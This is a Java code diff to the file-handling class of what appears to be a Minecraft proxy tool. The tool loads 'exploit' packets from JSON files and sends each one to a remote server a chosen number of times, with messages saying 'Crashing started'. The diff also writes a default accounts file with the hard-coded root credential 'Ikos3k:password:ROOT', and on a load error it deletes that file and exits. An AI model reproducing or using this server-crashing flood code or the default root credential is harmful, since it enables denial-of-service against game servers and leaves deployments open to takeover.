@@ -7,6 +7,7 @@ import me.ANONIMUS.proxy.objects.Exploit;
 import me.ANONIMUS.proxy.protocol.objects.Player;
 import me.ANONIMUS.proxy.protocol.packet.Packet;
 import me.ANONIMUS.proxy.protocol.packet.impl.CustomPacket;
+import org.codehaus.jackson.map.ObjectMapper;
 import org.json.simple.JSONArray;
 import org.json.simple.JSONObject;
 import org.json.simple.parser.JSONParser;
@@ -14,27 +15,30 @@ import org.json.simple.parser.ParseException;
 
 import javax.imageio.ImageIO;
 import java.awt.image.BufferedImage;
-import java.io.ByteArrayOutputStream;
-import java.io.File;
-import java.io.FileReader;
-import java.io.IOException;
+import java.io.*;
 import java.nio.charset.StandardCharsets;
-import java.util.Base64;
-import java.util.List;
-import java.util.Objects;
-import java.util.Scanner;
+import java.util.*;
 import java.util.stream.IntStream;
 
 public class FileUtil {
+    private final static File accountsFile = new File(BetterProxy.getInstance().getDirFolder() + "/accounts.txt");
+
     public static void createMissing() {
-        final String[] directories = new String[] { "world", "exploits", "schematics" };
+        final String[] directories = new String[] { "world", "exploits", "schematics", "players" };
 
         try {
             for(String d : directories) {
                 new File(BetterProxy.getInstance().getDirFolder() + "/" + d).mkdir();
             }
 
-            new File(BetterProxy.getInstance().getDirFolder() + "/accounts.txt").createNewFile();
+            if(!accountsFile.exists()) {
+                try (FileWriter fileWriter = new FileWriter(accountsFile)) {
+                    fileWriter.write("Ikos3k:password:ROOT");
+                    fileWriter.flush();
+                } catch (IOException e) {
+                    e.printStackTrace();
+                }
+            }
         } catch (Exception e) {
             e.printStackTrace();
         }
@@ -42,14 +46,15 @@ public class FileUtil {
 
     public static void loadAccounts() {
         try {
-            final Scanner s = new Scanner(new File(BetterProxy.getInstance().getDirFolder() + "/accounts.txt"));
+            final Scanner s = new Scanner(accountsFile);
             while (s.hasNext()) {
                 final String[] split = s.next().split(":", 3);
                 BetterProxy.getInstance().getAccounts().add(new Account(split[0], split[1], GroupType.valueOf(split[2])));
             }
             s.close();
         } catch (Exception e) {
-            e.printStackTrace();
+            accountsFile.delete();
+            System.exit(0);
         }
     }
 
@@ -73,36 +78,54 @@ public class FileUtil {
 
     public static void loadExploits() {
         final File directory = new File(BetterProxy.getInstance().getDirFolder() + "/exploits/");
-        if (directory.exists()) {
-            for (File f : Objects.requireNonNull(directory.listFiles())) {
-                if (!f.isDirectory()) {
-                    JSONParser parser = new JSONParser();
-                    Object obj = null;
-                    try {
-                        obj = parser.parse(new FileReader(f));
-                    } catch (IOException | ParseException ignored) { }
-                    JSONObject jsonObj = (JSONObject) obj;
-                    int id = ((Long) jsonObj.get("id")).intValue();
-                    List<Long> s = ((JSONArray) jsonObj.get("data"));
-                    byte[] data = new byte[s.size()];
-                    for (int i = 0; i < s.size(); i++) {
-                        data[i] = s.get(i).byteValue();
-                    }
 
-                    Packet p = new CustomPacket(id, data);
+        if (directory.listFiles() == null || directory.listFiles().length == 0) {
+            JSONObject jsonObj = new JSONObject();
+            int id = 1; String message = "xd";
+            List<Byte> bytesList = new ArrayList<>();
+            byte[] bytes = message.getBytes(StandardCharsets.UTF_8);
+            bytesList.add((byte) bytes.length);
+            for(byte b : bytes) { bytesList.add(b); }
 
-                    BetterProxy.getInstance().getExploitManager().addExploit(new Exploit(f.getName().substring(0, f.getName().length() - 5), "[amount]") {
+            jsonObj.put("id", id); jsonObj.put("data", bytesList);
 
-                        @Override
-                        public void execute(Player sender, Object... objects) {
-                            ChatUtil.sendChatMessage(sender.getThemeType().getColor(1) + ">> &8Crashing started, method: " + sender.getThemeType().getColor(1) + getName().toUpperCase(), sender, false);
-                            final int time = (int) System.currentTimeMillis();
-                            IntStream.range(0, Integer.parseInt((String) objects[0])).forEach(i -> sender.getRemoteSession().sendPacket(p));
-                            final int time2 = (int) System.currentTimeMillis() - time;
-                            ChatUtil.sendChatMessage(sender.getThemeType().getColor(1) + ">> &8Crashing complete &7(" + sender.getThemeType().getColor(2) + time2 + "ms&7)", sender, false);
-                        }
-                    });
+            try (FileWriter fileWriter = new FileWriter(new File(directory, "example.json"))) {
+                fileWriter.write(new ObjectMapper().defaultPrettyPrintingWriter().writeValueAsString(jsonObj));
+                fileWriter.flush();
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+            return;
+        }
+
+        for (File f : Objects.requireNonNull(directory.listFiles())) {
+            if (!f.isDirectory()) {
+                JSONParser parser = new JSONParser();
+                Object obj = null;
+                try {
+                    obj = parser.parse(new FileReader(f));
+                } catch (IOException | ParseException ignored) { }
+                JSONObject jsonObj = (JSONObject) obj;
+                int id = ((Long) jsonObj.get("id")).intValue();
+                List<Long> s = ((JSONArray) jsonObj.get("data"));
+                byte[] data = new byte[s.size()];
+                for (int i = 0; i < s.size(); i++) {
+                    data[i] = s.get(i).byteValue();
                 }
+
+                Packet p = new CustomPacket(id, data);
+
+                BetterProxy.getInstance().getExploitManager().addExploit(new Exploit(f.getName().substring(0, f.getName().length() - 5), "[amount]") {
+
+                    @Override
+                    public void execute(Player sender, Object... objects) {
+                        ChatUtil.sendChatMessage(sender.getThemeType().getColor(1) + ">> &8Crashing started, method: " + sender.getThemeType().getColor(1) + getName().toUpperCase(), sender, false);
+                        final int time = (int) System.currentTimeMillis();
+                        IntStream.range(0, Integer.parseInt((String) objects[0])).forEach(i -> sender.getRemoteSession().sendPacket(p));
+                        final int time2 = (int) System.currentTimeMillis() - time;
+                        ChatUtil.sendChatMessage(sender.getThemeType().getColor(1) + ">> &8Crashing complete &7(" + sender.getThemeType().getColor(2) + time2 + "ms&7)", sender, false);
+                    }
+                });
             }
         }
     }
